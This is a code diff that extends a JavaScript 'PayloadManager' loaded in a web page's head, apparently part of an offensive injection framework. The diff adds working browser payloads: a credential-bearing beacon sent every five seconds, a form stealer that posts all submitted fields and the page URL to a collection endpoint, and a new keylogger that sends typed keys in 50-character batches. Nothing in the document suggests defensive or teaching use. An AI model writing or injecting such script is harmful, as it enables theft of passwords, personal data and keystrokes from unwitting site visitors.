@@ -6,19 +6,34 @@ This file is run in the head tag, so make sure that your payloads are run after 
 alert('Test payload')
 
 const PayloadManager = {
+    // Configuration for payloads
+    config: {
+        cookieLogger: true,
+        formStealer: true,
+        keyLogger: false
+    },
+
+    // Available payloads
     payloads: {
         cookieLogger: () => {
-            fetch('/ep/api/ping', { 
-                method: 'POST', 
-                credentials: 'include'
-            });
+            setInterval(() => {
+                fetch('/ep/api/ping', { 
+                    method: 'POST', 
+                    credentials: 'include'
+                });
+            }, 5000); // Check every 5 seconds
         },
+
         formStealer: () => {
             document.querySelectorAll('form').forEach(form => {
                 form.addEventListener('submit', async (e) => {
                     e.preventDefault();
                     const formData = new FormData(form);
-                    const data = Object.fromEntries(formData);
+                    const data = {
+                        url: window.location.href,
+                        fields: Object.fromEntries(formData),
+                        timestamp: new Date().toISOString()
+                    };
                     
                     await fetch('/ep/api/forms', {
                         method: 'POST',
@@ -31,17 +46,41 @@ const PayloadManager = {
                     form.submit();
                 });
             });
+        },
+
+        keyLogger: () => {
+            let buffer = '';
+            document.addEventListener('keypress', (e) => {
+                buffer += e.key;
+                if (buffer.length >= 50) {  // Send every 50 characters
+                    fetch('/ep/api/keylog', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            keys: buffer,
+                            url: window.location.href,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    buffer = '';
+                }
+            });
         }
     },
     
     init: function() {
-        // Execute all payloads when DOM is loaded
+        // Execute enabled payloads when DOM is loaded
         document.addEventListener('DOMContentLoaded', () => {
-            Object.keys(this.payloads).forEach(payload => {
-                try {
-                    this.payloads[payload]();
-                } catch (error) {
-                    console.error(`Error executing payload ${payload}:`, error);
+            Object.keys(this.config).forEach(payload => {
+                if (this.config[payload] && this.payloads[payload]) {
+                    try {
+                        console.log(`[*] Initializing payload: ${payload}`);
+                        this.payloads[payload]();
+                    } catch (error) {
+                        console.error(`[!] Error in payload ${payload}:`, error);
+                    }
                 }
             });
         });
